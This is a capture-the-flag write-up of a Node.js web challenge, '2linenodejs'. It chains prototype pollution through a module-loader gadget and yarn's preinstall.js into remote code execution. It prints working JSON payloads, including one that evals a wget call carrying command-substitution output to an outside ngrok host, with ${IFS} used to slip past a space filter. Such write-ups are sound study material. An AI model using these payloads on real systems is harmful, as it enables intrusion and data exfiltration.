# 2linenodejs

## Description

Web | 13 solves

> Sorry for my bad coding style :(
>
> Author: ginoah

## Solution

### Prototype Pollution

Taking a look at the source, we see quite clearly that there is a prototype pollution here.

```javascript
#!/usr/local/bin/node
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
  try{
    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
    obj = JSON.parse(json);
    console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
  }catch (e) {
    require('./usage')
  }finally{
    process.exit();
  }
});
```

`JSON.parse` will allow the `__proto__` key, storing it as `['__proto__']` instead (which surprisingly works as a key when used here):

```javascript
module.exports=(O,o) => (
    Object.entries(O).forEach(
        ([K,V])=>Object.entries(V).forEach(
            ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
        )
    ), o
);
```

Great! We have a prototype pollution - how do we leverage it to an RCE?

### require() Gadget

After performing the pollution, we don't have much of a choice where we want to go. Either nothing happens and `process.exit()` is called, or we cause an exception and `require('./usage')` is called. Causing an exception is pretty simple and I actually stumbled upon it early on when testing simple payloads.

If one of the key-value pairs is a mapping to `null`, then `Object.entries(V)` will yield a `TypeError` since `null` cannot be converted to an `Object`.

```javascript
        ([K,V])=>Object.entries(V).forEach(
                        ^

TypeError: Cannot convert undefined or null to object
```

If we look into the `internal/modules/cjs/loader.js`, we see that in the `trySelf` function, there is a [possible gadget](https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L461).

If `readPackageScope` returns `false`, then the destructuring assignment should leave `pkg` and `pkgPath` as `undefined`, since the right-hand side is `{}`. But if we pollute `__proto__.data` and `__proto__.path`, then we can control `pkg` and `pkgPath`.

```javascript
function trySelf(parentPath, request) {
  if (!parentPath) return false;

  const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
  if (!pkg || pkg.exports === undefined) return false;
  if (typeof pkg.name !== 'string') return false;
```

But what is `pkg` and `pkgPath`? We could look at `readPackageScope` and find out that it calls&#x20;

[`readPackage`](https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L308) to populate the result, and `readPackage` just reads the `package.json` file of a Node.js module.

```javascript
function readPackage(requestPath) {
  const jsonPath = path.resolve(requestPath, 'package.json');

  const existing = packageJsonCache.get(jsonPath);
  if (existing !== undefined) return existing;
  
  ...
```

So `pkg` appears to just be an object containing the [`package.json` fields](https://nodejs.org/api/packages.html#nodejs-packagejson-field-definitions) and `pkgPath` is the path to this package. Importantly, we see `pkg.exports` being used a lot in the subsequent code path, and this makes sence given the following explanation of `exports` in `package.json`:

> The `"exports"` field allows defining the [entry points](https://nodejs.org/api/packages.html#package-entry-points) of a package when imported by name loaded either via a `node_modules` lookup or a [self-reference](https://nodejs.org/api/packages.html#self-referencing-a-package-using-its-name) to its own name.&#x20;

With this knowledge, we can confirm that the following exploit allows us to load any JavaScript file.

```json
{
    "__proto__": {
        "data": {
            "name": "./usage",
            "exports": {
                ".": "./some-file.js"
            }
        },
        "path": "/some/path/to/file",
    },
    "x": null
}
```

### preinstall.js Gadget

Initially doing a simple search for all JavaScript files in the container (`find / -name "*.js" 2>/dev/null`), we can find `/opt/yarn-v1.22.19/preinstall.js`. Doing a bit of digging, we can find out that this script is added from [here](https://github.com/yarnpkg/yarn/pull/8343).

Immediately we see in this script that we have `child_process.execFileSync` being called, which looks promising.

```javascript
if (process.env.npm_config_global) {
    var cp = require('child_process');
    var fs = require('fs');
    var path = require('path');

    try {
        console.log(process.execPath, process.env.npm_execpath)
        var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, 'bin', '-g'], {
            encoding: 'utf8',
            stdio: ['inherit', 'inherit', 'inherit'],
        }).replace(/\n/g, '');
        process.exit()
```

First off, to reach this code path we could need to pollute `npm_config_global` to a truthy value.

`process.execPath` is always `/usr/bin/node`, and we can't control it. But we could control `process.env.npm_execpath` since it is not set by default. Looking at the [CLI documentation](https://nodejs.org/api/cli.html), the [`-e` or `--eval`](https://nodejs.org/api/cli.html#-e---eval-script) option looks promising! This would basically allow us to run inline JavaScript.

One issue is that because the regex matches up to the first space character, our JSON cannot have any spaces.

```javascript
const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
```

To get around this, we use `${IFS}`. For instance, we could pollute `npm_execpath` to `--eval=require('child_process').execSync('sleep${IFS}5')`.

The final payload was using `wget` and command substitution to exfiltrate the `/readflag` output.

```javascript
{
    "__proto__": {
        "data": {
            "name": "./usage",
            "exports": {
                ".": "./preinstall.js"
            }
        },
        "path": "./",
        "npm_config_global": 1,
        "npm_execpath": "--eval=require('child_process').execSync('wget${IFS}https://012c-49-245-33-142.ngrok.io/`/readflag`')"
    },
    "x": null
}
```

This gives us the flag on our listening HTTP server.

```http
GET /BALSN%7BPr0toTyP3_PoL1u7i0n_1s_so_Cooooooool%21%21%21%7D HTTP/1.1
Host: 012c-49-245-33-142.ngrok.io
User-Agent: Wget
X-Forwarded-For: 44.204.208.69
X-Forwarded-Proto: https
Accept-Encoding: gzip
```
